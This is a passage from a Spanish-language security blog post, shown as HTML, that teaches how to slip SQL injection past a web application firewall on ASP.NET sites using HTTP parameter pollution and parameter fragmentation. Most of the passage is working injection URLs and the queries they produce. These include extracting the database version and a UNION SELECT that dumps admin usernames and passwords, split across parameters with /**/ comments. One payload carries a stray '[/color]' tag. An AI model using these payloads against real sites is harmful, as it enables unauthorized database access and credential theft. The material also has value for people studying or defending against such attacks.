esto engañariamos al firewall debido a que no podra identificar el vector de ataque entero.  Por lo tanto al tratarse de ASP.NET y sabiendo que concatena dos valores con coma el codigo se ejecutaria de la siguiente manera en el server.<br /><br /><pre class="brush: sql">SELECT user_name FROM usuarios WHERE id= 9999+OR+1=COVERT(INT,(@@VERSION))--<br /></pre><br /><b>OWNEANDO al WAF y obeteniendo la version del DBMS.</b>    <br /><br />Otra manera de darle mas dinamismo a esta tecnica es utilizando /**/ entre las variables  Que pasaria si el WAF nos detectara la inyeccion anterior por que tomaria como ofensivo el vector: <br /><br />id=9999+CONVERT(INT      si desearamos usar mas parametros para evadirlo asi:<br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999&amp;id=OR+1=&amp;id=CONVERT&amp;id=(INT&amp;id=(@@VERSION))--<br /></pre><br />La inyeccion se procesaria de esta manera en la base de datos: <br /><br /><pre class="brush: sql">SELECT user_name FROM usuarios WHERE id=9999,OR+1=,CONVERT,(INT,(@@VERSION))--<br /></pre><br />Esto daria error de sintaxis, para solucionarlo utilizaremos nuestra amiga /**/ vistiendo cada parametro   Quedando de la siguiente manera:      <br /><br /><pre class="brush: sql">http://somepage/intranet.aspx?id=9999/*&amp;id=*/OR+1=/*&amp;id=*/CONVERT/*&amp;id=*/(INT&amp;id=(@@VERSION))--<br /></pre><br />Ahora si podemos decir OWNED BABY!<br /><br /><b>[0x3d] HPF (Fragmentacion de parametros HTTP)</b>   <br /><br />La fragmentacion de parametros HTTP me recuerda a cuando utilizamos la opcion -f de nmap para fragmentar paquetes IP y asi evadir las estrictas reglas del firewall, esta tecnica no es muy diferente a la que mencione anteriormente (HPP), la unica diferencia es que podemas usarla algun path que utilize varios parametros  por ejemplo tenemos la siguiente url: <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1&amp;nan=2&amp;lala=3<br /></pre><br />Podemos fragmentar el vector de ataque entre las variables id= nan= lala=  Supongamos que el servidor corre coN una base de datos MYSQL que no es muy comun, en su mayoria las web que utilizan tecnologia ASP.NET o ASP, corren con algun SQL SERVER 200*  Inyectando normalmente:     <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1 UNION SELECT 1,2,concat(username, 0x3a, password)+FROM+admin+LIMIT+1,1-- &amp;nan=2&amp;lala=3<br /></pre><br />Para fragmentar dicho vector y siempre recordando que ASP.NET concatena 2 o mas valores con , podriamos intentar asi:       <br /><br /><pre class="brush: sql">http://url.com/index.aspx?id=1+UNION+SELECT+1/*&amp;nan=*/2,concat(username, 0x3a, password)/*&amp;lala=*/FROM+admin+LIMIT+1,1--<br /></pre><br />Podemos usar la imaginacion para moldear varios tipos de ataque con ambas tecnicas, recordando siempre y cuando como trabaja y toma los valores la tecnologia que corre en el servidor.<br /><br /><pre class="brush: sql">http://lalala/index.aspx?id=1+UNION+SELECT+1/*&amp;nan=*/[/color]2,concat(username, 0x3a, password)/*&amp;lala=*/FROM+admin+LIMIT+1,1--<br /></pre><br /><div style="text-align: right;">Saludos!!</div></div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/12">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/10">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
